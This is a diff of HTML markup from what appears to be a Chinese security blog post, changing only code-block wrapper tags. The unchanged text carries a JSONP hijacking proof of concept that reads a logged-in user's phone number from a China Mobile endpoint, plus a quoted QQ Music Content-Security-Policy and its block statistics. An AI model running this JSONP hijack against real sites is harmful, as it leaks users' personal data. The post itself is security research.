@@ -75,7 +75,7 @@
 
 <p>获取手机号的poc</p>
 
-<div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">angular</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"callbacks"</span><span class="p">:</span> <span class="p">{</span><span class="s2">"_y"</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span><span class="nx">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">respparam</span><span class="p">.</span><span class="nx">phoneNumber</span><span class="p">);}}};</span>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">angular</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"callbacks"</span><span class="p">:</span> <span class="p">{</span><span class="s2">"_y"</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span><span class="nx">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">respparam</span><span class="p">.</span><span class="nx">phoneNumber</span><span class="p">);}}};</span>
 
 <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
         <span class="na">url</span><span class="p">:</span> <span class="s2">"http://wap.toolbar.sd.chinamobile.com:8080/html/servicereq/queryMessageList?callback=angular.callbacks._y&amp;csession=-1648015146&amp;reqparam=%7B%22flag%22:%22-1%22,%22startNum%22:%221%22,%22number%22:%2210%22%7D&amp;templateId=fullscreenbar"</span><span class="p">,</span>
@@ -83,8 +83,7 @@
         <span class="na">dataType</span><span class="p">:</span> <span class="s2">"jsonp"</span><span class="p">,</span>
         <span class="na">jsonp</span><span class="p">:</span> <span class="s2">"angular.callbacks._y"</span><span class="p">,</span>
 <span class="p">})</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="http://storage.virusdefender.net/blog/images/732/4.jpg" alt="请输入图片描述" /></p>
 
@@ -92,9 +91,8 @@
 
 <p>根据 http://www.cnblogs.com/Kevin-Zhao/articles/5216686.html qq音乐全站使用了下面的CSP策略</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>content-security-policy:script-src https: *.qq.com *.sinajs.cn *.gtimg.cn *.url.cn *.tenpay.com *.qpic.cn *.qpimg.cn *.idqqimg.com *.gtimg.com *.soso.com 'unsafe-inline' 'unsafe-eval'; report-uri http://qm.music.qq.com/report_csp
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>content-security-policy:script-src https: *.qq.com *.sinajs.cn *.gtimg.cn *.url.cn *.tenpay.com *.qpic.cn *.qpimg.cn *.idqqimg.com *.gtimg.com *.soso.com 'unsafe-inline' 'unsafe-eval'; report-uri http://qm.music.qq.com/report_csp
+</code></pre></div></div>
 
 <p>2016年02月21日一天内就有2,322,499次占1.63%的PV被拦截上报，统计如下</p>
 
